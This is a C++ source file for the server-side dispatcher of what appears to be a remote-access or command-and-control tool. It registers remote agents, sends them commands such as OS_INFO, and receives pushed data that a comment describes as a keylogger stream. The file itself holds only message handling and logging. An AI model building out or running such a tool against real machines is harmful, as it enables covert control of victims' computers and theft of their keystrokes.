#include "server_dispatcher.hpp"

#include <stdexcept>

ServerDispatcher::ServerDispatcher() {}

void ServerDispatcher::handleFrame(AgentSession& agent, const Frame& frame) {
  switch (frame.header.type) {
    case MessageType::REGISTER:
      onRegister(agent, frame.payload);
      break;
    case MessageType::RESPONSE:
      onResponse(agent, frame.payload);
      break;
    case MessageType::DATA:
      onData(frame.payload);
      break;
    // case MessageType::DISCONNECT:
    //   running = false;
    //   break;
    case MessageType::ERROR:
      onError(frame.payload);
      break;
    default:
      sendError(agent, ErrorType::UNKNOWN_TYPE, "Unexpected message type");
  }
}

// ── Incoming handlers ────────────────────────────────────────

// The first message from the agent must always be REGISTER.
// Once we know who it is, we kick off the command sequence.
void ServerDispatcher::onRegister(AgentSession& agent,
                            const std::vector<std::uint8_t>& payload) {
  RegisterPayload agentInfo = ProtocolParser::parseRegisterPayload(payload);
  agent.setAgentInfo(agentInfo);
  agent.setRegistered(true);

  std::cout << "[← REGISTER] hostname=" << agentInfo.hostname
            << "  os=" << static_cast<int>(agentInfo.os_type)
            << "  arch=" << static_cast<int>(agentInfo.arch) << "\n";

  // First command: ask the agent for OS info.
  sendCommand(agent, CommandType::OS_INFO);
}

// A RESPONSE carries the same id as the COMMAND it answers,
// plus chunk metadata for large payloads split across messages.
void ServerDispatcher::onResponse(AgentSession& agent,
                            const std::vector<std::uint8_t>& payload) {
  const ResponsePayload response =
      ProtocolParser::parseResponsePayload(payload);
  std::cout << "[← RESPONSE] id=" << response.id
            << "  chunk=" << static_cast<int>(response.chunk_index) + 1 << "/"
            << static_cast<int>(response.total_chunks)
            << "  status=" << static_cast<int>(response.status) << "\n"
            << response.data << "\n";

  // Only act once all chunks of this response have arrived.
  const bool lastChunk = response.chunk_index + 1 == response.total_chunks;
  if (lastChunk) sendDisconnect(agent);
  // → To send more commands, push them here instead of disconnecting.
}

// DATA messages are pushed by the agent without a prior COMMAND
// (e.g. keylogger stream). Handle them independently of the
// request/response cycle.
void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
  const DataPayload data = ProtocolParser::parseDataPayload(payload);
  std::cout << "[← DATA] subtype=" << static_cast<int>(data.subtype) << "\n"
            << data.data << "\n";
}

// ── Outgoing senders ─────────────────────────────────────────

void ServerDispatcher::sendCommand(AgentSession& agent, CommandType type,
                             const std::string& data) {
  CommandPayload command;
  command.id = nextId();
  command.type = type;
  command.data = data;
  const std::vector<std::uint8_t> payload =
      ProtocolSerializer::serializeCommandPayload(command);

  Frame frame = {SocketHelper::createHeader(MessageType::COMMAND, payload),
                 payload};
  sendFrame(agent, frame, senderName);
  // sendRaw(agent, MessageType::COMMAND, payload);
  std::cout << "[→ COMMAND] id=" << command.id
            << "  type=" << static_cast<int>(command.type) << "\n";
}

void ServerDispatcher::sendDisconnect(AgentSession& agent) {
  const std::vector<uint8_t> payload{};
  Frame frame = {SocketHelper::createHeader(MessageType::DISCONNECT, payload)};
  // sendRaw(agent, MessageType::DISCONNECT);
  sendFrame(agent, frame, senderName);
  std::cout << "[→ DISCONNECT]\n";
  //   running = false;
}

std::uint16_t ServerDispatcher::nextId() { return nextCmdId++; }